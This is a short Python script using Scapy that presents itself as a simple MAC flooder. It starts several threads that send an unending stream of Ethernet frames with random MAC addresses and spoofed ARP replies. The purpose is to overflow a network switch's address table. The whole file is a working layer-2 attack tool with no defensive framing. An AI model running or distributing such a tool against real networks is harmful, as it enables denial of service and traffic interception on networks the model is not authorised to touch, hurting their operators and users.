from scapy.all import *
from time import sleep
import random
import threading
import argparse

threads = 4
answ = False
count = 0

def perform_query():
    while True:
        global count
        sendp(Ether(src=RandMAC(),dst=getRandomMAC())/ARP(op=2, psrc="0.0.0.0", hwdst=getRandomMAC())/Padding(load="X"*18), verbose=0)
        count = count + 1
        print(f"Sent packet: {count}")

def getRandomMAC():
    genMAC = f"{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}:{random.randint(1,9)}{random.randint(1,9)}"
    return genMAC

def flood(): 
    perform_query()

def startThreads():
    for i in range(1,threads):
        t = threading.Thread(target=flood)
        t.start()

print("RUN AS ROOT!")
sleep(1)

parser = argparse.ArgumentParser(prog="main.py", usage='%(prog)s [options]',description='Simple MAC-Flooder using Scapy')
parser.add_argument('-t', metavar='N', type=int, nargs='+', help='threads to use')
args = parser.parse_args()

if args.t == None:
    print("No arguments specified!")
    print('Hint: use "-h" to get help')
else:
    threads = int(args.t[0])
    print(f"Using thread count of: {threads}")
    sleep(1)
    startThreads()